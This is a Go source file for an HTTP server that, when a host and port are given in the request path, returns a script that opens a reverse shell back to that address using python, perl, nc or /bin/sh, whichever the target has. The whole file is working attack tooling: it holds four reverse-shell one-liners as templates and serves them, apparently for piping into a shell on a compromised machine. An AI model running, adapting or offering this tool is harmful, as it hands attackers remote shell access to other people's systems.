package main

import (
	"bytes"
	"flag"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"text/template"

	"github.com/valyala/fasthttp"
)

// RemoteInfo contains info about the remote connection
type RemoteInfo struct {
	Host string
	Port string
}

// ShellInfo contains info about the reverse shell
type ShellInfo struct {
	Command string
	Payload string
}

var (
	addr        = flag.String("addr", "localhost:9999", "Address to listen for fasthttp")
	scriptTypes = []string{
		"python",
		"perl",
		"nc",
		"sh",
	}
	scripts = []string{
		`python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{{.Host}}",{{.Port}})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
		`perl -e 'use Socket;$i="{{.Host}}";$p={{.Port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
		`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{.Host}} {{.Port}} >/tmp/f`,
		`/bin/sh -i >& /dev/tcp/{{.Host}}/{{.Port}} 0>&1`,
	}
	scriptTemplates = []*template.Template{}
	ifHandler       = `if command -v {{.Command}} > /dev/null 2>&1; then {{.Payload}}; exit; fi`
	ifTemplate      *template.Template
)

func main() {
	flag.Parse()

	ifTemplateStart, err := template.New("ifTemplate").Parse(ifHandler)
	if err != nil {
		log.Fatalf("%sError in parsing ifTemplate: %s%s", red, err, reset)
	}
	ifTemplate = ifTemplateStart

	for k, v := range scripts {
		scriptTemplate, err := template.New("scriptTemplate" + strconv.Itoa(k)).Parse(v)
		if err != nil {
			log.Fatalf("%sError in parsing ifTemplate: %s%s", red, err, reset)
		}
		scriptTemplates = append(scriptTemplates, scriptTemplate)
	}

	listenAddr := os.Getenv("PORT")
	if listenAddr == "" {
		listenAddr = *addr
	} else {
		listenAddr = ":" + listenAddr
	}

	log.Printf("%sStarting shell handler on %s%s\n", cyan, listenAddr, reset)
	if err := fasthttp.ListenAndServe(listenAddr, handler); err != nil {
		log.Fatalf("%sError in ListenAndServe: %s%s", red, err, reset)
	}
}

func handler(ctx *fasthttp.RequestCtx) {
	defer logReq(ctx)

	splitPath := strings.Split(string(ctx.Path()), "/")
	ctx.WriteString(parseScript(splitPath[len(splitPath)-1]))

	return
}

func parseScript(host string) string {
	script := ""
	host, port, err := net.SplitHostPort(host)
	if err != nil {
		return script
	}

	info := RemoteInfo{Host: host, Port: port}

	for k, v := range scriptTemplates {
		var templateOut bytes.Buffer
		err := v.Execute(&templateOut, info)
		if err != nil {
			return ""
		}

		var ifTemplateOut bytes.Buffer
		ifTemplate.Execute(&ifTemplateOut, ShellInfo{Command: scriptTypes[k], Payload: templateOut.String()})
		script += ifTemplateOut.String() + "\n"
	}

	return script
}
